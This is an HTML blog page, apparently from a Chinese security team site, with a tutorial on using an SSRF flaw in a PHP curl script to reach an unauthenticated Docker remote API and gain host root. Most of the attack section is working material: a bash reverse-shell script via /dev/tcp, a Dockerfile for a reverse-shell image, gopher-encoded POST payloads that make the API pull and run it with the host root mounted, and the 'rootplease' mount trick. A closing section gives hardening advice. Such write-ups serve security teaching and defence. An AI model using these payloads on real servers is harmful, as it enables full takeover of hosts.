@@ -1,0 +1,805 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Web,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/s.ico?v=5.0.1">
+
+
+
+
+
+
+<meta name="description" content="首发于freebuf http://www.freebuf.com/articles/web/179910.html 这几天在做关于自动化部署docker镜像方面的项目，从而接触到了docker的api，而docker的api也可以通过tcp连接的形式来进行访问。那么从一个安全爱好者的角度出发，是否可以利用docker的远程api来实现提权等一系列的操作？查找了各种资料之后，最后我探索到了一条通">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用SSRF攻击docker remote api从而获取服务器root权限的探索">
+<meta property="og:url" content="http://yoursite.com/Web/SSRF-DOCKER-RCE/index.html">
+<meta property="og:site_name" content="SUS">
+<meta property="og:description" content="首发于freebuf http://www.freebuf.com/articles/web/179910.html 这几天在做关于自动化部署docker镜像方面的项目，从而接触到了docker的api，而docker的api也可以通过tcp连接的形式来进行访问。那么从一个安全爱好者的角度出发，是否可以利用docker的远程api来实现提权等一系列的操作？查找了各种资料之后，最后我探索到了一条通">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://image.3001.net/images/20180806/1533549633_5b681c41397a8.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20180806/1533549670_5b681c66b2a75.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20180806/1533549678_5b681c6ee6b4c.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20180806/1533549693_5b681c7d2b544.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20180806/1533549895_5b681d4734a8a.png!small">
+<meta property="og:image" content="http://yoursite.com/Web/SSRF-DOCKER-RCE/pull.png">
+<meta property="og:image" content="http://image.3001.net/images/20180806/1533549978_5b681d9a90183.png!small">
+<meta property="og:image" content="http://yoursite.com/Web/SSRF-DOCKER-RCE/create.png">
+<meta property="og:image" content="http://image.3001.net/images/20180806/1533550032_5b681dd030497.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20180806/1533550043_5b681ddb80ec8.png!small">
+<meta property="og:image" content="http://yoursite.com/Web/SSRF-DOCKER-RCE/attack.png">
+<meta property="og:image" content="http://yoursite.com/Web/SSRF-DOCKER-RCE/getshell.png">
+<meta property="og:image" content="http://image.3001.net/images/20180806/1533550066_5b681df2b82f9.png!small">
+<meta property="og:image" content="http://yoursite.com/Web/SSRF-DOCKER-RCE/flow.png">
+<meta property="og:updated_time" content="2019-02-02T00:38:08.505Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用SSRF攻击docker remote api从而获取服务器root权限的探索">
+<meta name="twitter:description" content="首发于freebuf http://www.freebuf.com/articles/web/179910.html 这几天在做关于自动化部署docker镜像方面的项目，从而接触到了docker的api，而docker的api也可以通过tcp连接的形式来进行访问。那么从一个安全爱好者的角度出发，是否可以利用docker的远程api来实现提权等一系列的操作？查找了各种资料之后，最后我探索到了一条通">
+<meta name="twitter:image" content="http://image.3001.net/images/20180806/1533549633_5b681c41397a8.png!small">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: undefined,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/Web/SSRF-DOCKER-RCE/">
+
+  <title> 利用SSRF攻击docker remote api从而获取服务器root权限的探索 | SUS </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e877d3fb346f9b6606dfc92ef67f044f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+    
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader" style="background-image: url('/images/home.jpg');">
+      <div class="header-inner"><a class="site-home" href="/">SUS</a>
+
+<div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <div href="/" class="brand">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">SUS</span>
+      <span class="logo-line-after"><i></i></span>
+    </div>
+  </div>
+  <p class="site-subtitle">秉承古典黑客精神，引领一流网络安全体验</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-notice">
+          <a href="/tags/Notice/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-bell"></i> <br>
+            
+            Notice
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-course">
+          <a href="/course" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            Course
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-oj">
+          <a href="/CtfPlantform" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br>
+            
+            OJ
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-wiki">
+          <a href="/wiki" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wikipedia-w"></i> <br>
+            
+            CTF-wiki
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+      <div class="header-post"> 
+  <div class="post-header">
+      <div class="tags">
+      
+        <a href="/tags/Web/" rel="tag" title="Web">Web</a>
+      
+      </div>
+      <h1>利用SSRF攻击docker remote api从而获取服务器root权限的探索</h1>
+      <h2 class="subtitle"></h2>
+      <div class="post-time">
+        <span class="post-meta-item-text">Posted on </span>
+        <time itemprop="dateCreated" datetime="2018-08-16T09:04:56+08:00" content="2018-08-16" title="2018-08-16 09:04:56">
+          2018-08-16
+        </time>
+      </div>
+  </div>
+ </div>
+    </header>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                利用SSRF攻击docker remote api从而获取服务器root权限的探索
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2018-08-16T09:04:56+08:00" content="2018-08-16">
+              2018-08-16
+            </time>
+          </span>
+
+          
+            <span class="post-category">
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index">
+                    <span itemprop="name">Web</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          <!-- 
+            
+           -->
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>首发于freebuf <a href="http://www.freebuf.com/articles/web/179910.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/179910.html</a></p>
+<p>这几天在做关于自动化部署docker镜像方面的项目，从而接触到了docker的api，而docker的api也可以通过tcp连接的形式来进行访问。那么从一个安全爱好者的角度出发，是否可以利用docker的远程api来实现提权等一系列的操作？查找了各种资料之后，最后我探索到了一条通过SSRF漏洞来攻击docker远程api从而最终还能够获得远程主机的root权限的攻击思路，并写了这篇文章来记录一下整个过程及其防范的方法。</p>
+</blockquote>
+<h2 id="什么是docker远程api？"><a href="#什么是docker远程api？" class="headerlink" title="什么是docker远程api？"></a>什么是docker远程api？</h2><p>Docker Remote API是docker团队为了方便我们远程管理docker而为我们提供的一套api接口。在默认的情况下，docker daemon坚挺在unix socket上，通常为unix:///var/run/docker.sock。此外，在一些情况比如当我们需要远程管理docker服务器或者是创建docker集群的情况下，我们往往需要开启docker的远程api。这里给出在ubuntu上的一种开启方法：</p>
+<ul>
+<li>编辑<code>/lib/systemd/system/docker.service</code>文件，修改ExecStart一行为：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Type=notify</span><br><span class="line"># the default is not to use systemd for cgroups because the delegate issues still</span><br><span class="line"># exists and systemd currently does not support the cgroup feature set required</span><br><span class="line"># for containers run by docker</span><br><span class="line">ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243</span><br><span class="line">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class="line">LimitNOFILE=1048576</span><br></pre></td></tr></table></figure>
+<ul>
+<li>之后再重启docker</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure>
+<p>我们便可以利用docker client或者任意http客户端访问docker服务，例如<img src="http://image.3001.net/images/20180806/1533549633_5b681c41397a8.png!small" alt="docker_remote.png"></p>
+<p>可以看到docker提供的api其实也是一个restful形式的http接口，具体的文档可以再docker的官网获取：<a href="https://docs.docker.com/engine/api/v1.24/#31-containers" target="_blank" rel="noopener">Engine API V1.24</a></p>
+<p>这里列出几个重要的接口：</p>
+<ul>
+<li>列出所有的容器</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:/localhost:4243/v1.24/containers/json</span><br></pre></td></tr></table></figure>
+<ul>
+<li>列出所有镜像</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:/localhost:4243/v1.24/images/json[&#123;</span><br><span class="line">  &quot;Id&quot;:&quot;sha256:31d9a31e1dd803470c5a151b8919ef1988ac3efd44281ac59d43ad623f275dcd&quot;,</span><br><span class="line">  &quot;ParentId&quot;:&quot;sha256:ee4603260daafe1a8c2f3b78fd760922918ab2441cbb2853ed5c439e59c52f96&quot;,</span><br><span class="line">  ...</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>创建并运行容器</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ curl  -H &quot;Content-Type: application/json&quot; \</span><br><span class="line">  -d &apos;&#123;&quot;Image&quot;: &quot;alpine&quot;, &quot;Cmd&quot;: [&quot;echo&quot;, &quot;hello world&quot;]&#125;&apos; \</span><br><span class="line">  -X POST http:/localhost:4243/v1.24/containers/create</span><br><span class="line">&#123;&quot;Id&quot;:&quot;1c6594faf5&quot;,&quot;Warnings&quot;:null&#125;</span><br><span class="line"></span><br><span class="line">$ curl   -X POST http:/localhost:4243/v1.24/containers/1c6594faf5/start</span><br><span class="line"></span><br><span class="line">http:/localhost:4243/v1.24/containers/1c6594faf5/wait</span><br><span class="line">&#123;&quot;StatusCode&quot;:0&#125;</span><br><span class="line"></span><br><span class="line">$ curl  &quot;http:/localhost:4243/v1.24/containers/1c6594faf5/logs?stdout=1&quot;</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<p>可以看到如果开放了docker远程api，我们便可以使用restful接口来实现一切docker容器的操作。</p>
+<h2 id="怎样利用docker容器提权？"><a href="#怎样利用docker容器提权？" class="headerlink" title="怎样利用docker容器提权？"></a>怎样利用docker容器提权？</h2><p>有些朋友可能会问了：docker容器内部是一个虚拟化的环境，与主机隔离，那么怎样才能利用docker容器达到主机的控制权？这里就涉及到docker运行时的用户权限了。<code>docker daemon</code>运行时是以root用户运行，因而具有极大的权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ps aux|grep dockerd</span><br><span class="line">root      1723  0.1  0.8 563472 68900 ?        Ssl  17:17   0:24 /usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243</span><br><span class="line">image    25504  0.0  0.0  15984   936 pts/3    S+   21:12   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn dockerd</span><br></pre></td></tr></table></figure>
+<p>那么怎样通过docker daemon最终获得服务器的root权限？这里我们可以利用docker挂载宿主机文件的功能，直接挂载高权限目录，从而在容器内部获取宿主机的控制权限。这里有一个黑魔法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
+<p>运行后的输出如下：<img src="http://image.3001.net/images/20180806/1533549670_5b681c66b2a75.png!small" alt="verify">我们退出docker,查看宿主机/root/目录：<img src="http://image.3001.net/images/20180806/1533549678_5b681c6ee6b4c.png!small" alt="success">可以看到我们成功写入了/root文件夹一个文件。上面那条命令 <code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code>主要的作用是：从 Docker Hub 上面下载我们指定的镜像，然后运行。参数 -v 将容器外部的目录 / 挂载到容器内部 /hostOS，并且使用 -i 和 -t 参数进入容器的 shell。而这个镜像<code>rootplease</code>在容器内部执行了一个脚本<code>exploit.sh</code>，主要内容便是chroot到/hostOS中。这样我们便通过读写宿主机的任意文件实现了获取宿主机的最高权限。这个镜像的源码可以在<a href="https://github.com/chrisfosterelli/dockerrootplease/blob/master/exploit.sh" target="_blank" rel="noopener">Github</a>上获取。</p>
+<h2 id="怎样通过SSRF完成攻击？"><a href="#怎样通过SSRF完成攻击？" class="headerlink" title="怎样通过SSRF完成攻击？"></a>怎样通过SSRF完成攻击？</h2><p>这里我们的服务器端环境如下:</p>
+<p><img src="http://image.3001.net/images/20180806/1533549693_5b681c7d2b544.png!small" alt="environ"></p>
+<p>这里我们来看在php中经常出现的导致SSRF漏洞的代码实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl=curl_init();</span><br><span class="line">curl_setopt($curl,CURLOPT_URL,$_GET[&apos;url&apos;]);</span><br><span class="line">curl_setopt($curl,CURLOPT_HEADER,0);</span><br><span class="line">curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);</span><br><span class="line">$data=curl_exec($curl);</span><br><span class="line">curl_close($curl);</span><br><span class="line">print_r($data);</span><br></pre></td></tr></table></figure>
+<p>php中通常使用libcurl来实现http请求，这里可以看到<code>$_GET[&#39;url&#39;]</code>可控，从而可以请求任意站点，从而构成了SSRF漏洞。但是有的读者有可能会问：docker的api有很大一部分是需要post的，那么怎样才能发送post封包？这里便祭出我们的大杀器——<code>gopher协议</code>。Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。 这里Ricterz师傅曾经写过一篇很好的<a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">关于gopher协议扩展ssrf攻击面的文章</a>。因此我们便可以通过gopher协议来访问内网开放的<code>docker api</code>从而实现攻击。我们可以先尝试获取所有的镜像：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@1ae6b62d1757:/var/www/html# curl localhost/curl.php?url=http://172.17.0.1:4243/containers/json</span><br><span class="line">[&#123;&quot;Id&quot;:&quot;fa169d6b4239882bb6a0a2d564fd9891c04cf199ac12daec514f69febf960e9b&quot;,&quot;Names&quot;:[&quot;/quirky_mcnulty&quot;],&quot;Image&quot;:&quot;chrisfosterelli/rootplease&quot;,&quot;ImageID&quot;:&quot;sha256:0db941813769383d7ed3bdcccd27af1b6d7b47ed0fb33f1b47f7bb937529fa3e&quot;,&quot;Command&quot;:&quot;/bin/bash exploit.sh&quot;,&quot;Created&quot;:1533475418,&quot;Ports&quot;:[],&quot;Labels&quot;:&#123;&#125;,&quot;State&quot;:&quot;running&quot;,&quot;Status&quot;:&quot;Up 17 minutes&quot;,&quot;HostConfig&quot;:&#123;&quot;NetworkMode&quot;:&quot;default&quot;&#125;,&quot;NetworkSettings&quot;:&#123;&quot;Networks&quot;:&#123;&quot;bridge&quot;:&#123;&quot;IPAMConfig&quot;:null,&quot;Links&quot;:null,&quot;Aliases&quot;:null,&quot;NetworkID&quot;:&quot;9a8a2dd6afbbc355194a5fd224757ac8fe11760dbfde91c07c46689146e15089&quot;,&quot;EndpointID&quot;:&quot;a079ba4ac68eafb5add6b56822dd13a288ca059a815e7a011e82bdcb8fd8542b&quot;,&quot;Gateway&quot;:&quot;172.17.0.1&quot;,&quot;IPAddress&quot;:&quot;172.17.0.4&quot;,&quot;IPPrefixLen&quot;:16,&quot;IPv6Gateway&quot;:&quot;&quot;,&quot;GlobalIPv6Address&quot;:&quot;&quot;,&quot;GlobalIPv6PrefixLen&quot;:0,&quot;MacAddress&quot;:&quot;02:42:ac:11:00:04&quot;,&quot;DriverOpts&quot;:null&#125;&#125;&#125;,&quot;Mounts&quot;:[&#123;&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/&quot;,&quot;Destination&quot;:&quot;/hostOS&quot;,&quot;Mode&quot;:&quot;&quot;,&quot;RW&quot;:true,&quot;Propagation&quot;:&quot;rslave&quot;&#125;]&#125;,]</span><br></pre></td></tr></table></figure>
+<p>我们可以先构造一个特殊的docker镜像，并将之上传到DockerHub</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:14.04</span><br><span class="line">COPY exploit.sh /exploit.sh</span><br><span class="line">ENTRYPOINT [&quot;/bin/bash&quot;, &quot;exploit.sh&quot;]</span><br></pre></td></tr></table></figure>
+<p>这里我们的exploit.sh的写法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/$1/$2 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>这里的docker镜像已经上传到了<a href="https://hub.docker.com/r/imagemlt/reverse_shell/" target="_blank" rel="noopener">dockerhub</a>。</p>
+<p>之后我们可以先构造合适的post封包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/images/create?fromImage=imagemlt/reverse_shell HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">X-Registry-Auth: e30=</span><br></pre></td></tr></table></figure>
+<p>这个post封包的目标是让远程主机从dockerhub下载我们需要的镜像。构造为gopher格式为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.17.0.1:4243/_POST%20/v1.24/images/create%3FfromImage%3Dimagemlt/reverse_shell%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%200%0AContent-Type%3A%20text/plain%0A X-Registry-Auth:%20e30%3D%0A%0A</span><br></pre></td></tr></table></figure>
+<p>通过ssrf的点触发即可在远程服务器下载我们的镜像。<img src="http://image.3001.net/images/20180806/1533549895_5b681d4734a8a.png!small" alt="pull.png"></p>
+<p><img src="/Web/SSRF-DOCKER-RCE/pull.png" alt></p>
+<p>之后再创建容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/containers/create HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;Cmd&quot;:[&quot;your ip&quot;,&quot;3456&quot;],&quot;Image&quot;:&quot;imagemlt/reverse_shell&quot;,&quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/:/hostOS&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>将封包包装为gopher的形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.17.0.1:4243/_POST%20/v1.24/containers/create%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%2099%0AContent-Type%3A%20application/json%0A%0A%7B%22Cmd%22%3A%5B%22your ip%22%2C%223456%22%5D%2C%22Image%22%3A%22imagemlt/reverse_shell%22%2C%22HostConfig%22%3A%7B%22Binds%22%3A%5B%22/%3A/hostOS%22%5D%7D%7D%0A%0d%0a</span><br></pre></td></tr></table></figure>
+<p>这里我们再最后多加了一些%0d%0a从而让连接能够断开。然后利用之前的ssrf的地方请求这个url，可以获得创建的容器id：<img src="http://image.3001.net/images/20180806/1533549978_5b681d9a90183.png!small" alt="create.png"></p>
+<p><img src="/Web/SSRF-DOCKER-RCE/create.png" alt></p>
+<p>获取id后我们再post相应的使容器运行的封包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/containers/5a42a09f7bb889f53943015346682388d40a151ec5bad30024282eee11811380/start HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
+<p>我们的服务器端nc端口3456，构造gopher格式的url候再次发送封包：</p>
+<p><img src="http://image.3001.net/images/20180806/1533550032_5b681dd030497.png!small" alt="attack.png"><img src="http://image.3001.net/images/20180806/1533550043_5b681ddb80ec8.png!small" alt="getshell.png"></p>
+<p><img src="/Web/SSRF-DOCKER-RCE/attack.png" alt>可以看到服务器端成功返回shell，且已成功挂载宿主机根目录到/hostOS下。</p>
+<p><img src="/Web/SSRF-DOCKER-RCE/getshell.png" alt></p>
+<p>这样我们便通过ssrf与docker未授权api完成了一次攻击，并且获取了宿主机的root权限！</p>
+<p>除了反弹shell的方法，我们也可以借助写crontab的方法来获得最后的shell，这里便不再赘述。</p>
+<h2 id="如何防范？"><a href="#如何防范？" class="headerlink" title="如何防范？"></a>如何防范？</h2><p>在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：</p>
+<ul>
+<li><p>设置ACL，仅允许信任的来源IP连接；</p>
+</li>
+<li><p>设置TLS认证，官方的文档为Protect the Docker daemon socket</p>
+</li>
+</ul>
+<p>客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://10.10.10.10:2375 -H unix:///var/run/docker.sock</span><br></pre></td></tr></table></figure>
+<p>客户端连接时需要设置以下环境变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export DOCKER_TLS_VERIFY=1</span><br><span class="line">export DOCKER_CERT_PATH=~/.docker</span><br><span class="line">export DOCKER_HOST=tcp://10.10.10.10:2375</span><br><span class="line">export DOCKER_API_VERSION=1.12</span><br></pre></td></tr></table></figure>
+<p>这样便可以避免未授权的docker api被远程利用。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>未授权的docker remote api具有极大的风险，当结合ssrf漏洞时可以作为渗透测试扩展供给面的工具，最后获得root shell.因此我们做开发时应该严格防范。最后总结一下我们的攻击思路：</p>
+<p><img src="http://image.3001.net/images/20180806/1533550066_5b681df2b82f9.png!small" alt="flow.png"></p>
+<p><img src="/Web/SSRF-DOCKER-RCE/flow.png" alt></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://sec.xiaomi.com/article/22" target="_blank" rel="noopener">https://sec.xiaomi.com/article/22</a></li>
+<li><a href="http://dockone.io/article/401" target="_blank" rel="noopener">http://dockone.io/article/401</a></li>
+<li><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></li>
+</ul>
+
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" <i class="fa fa-tag">Web</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/CTF/Writeup/ISITDTUCTF-WEB-WRITEUP/" rel="next" title="ISITDTUCTF web writeup">
+                <i class="fa fa-chevron-left"></i> ISITDTUCTF web writeup
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/Notice/2018秋季招新/" rel="prev" title="2018秋季招新">
+                2018秋季招新 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
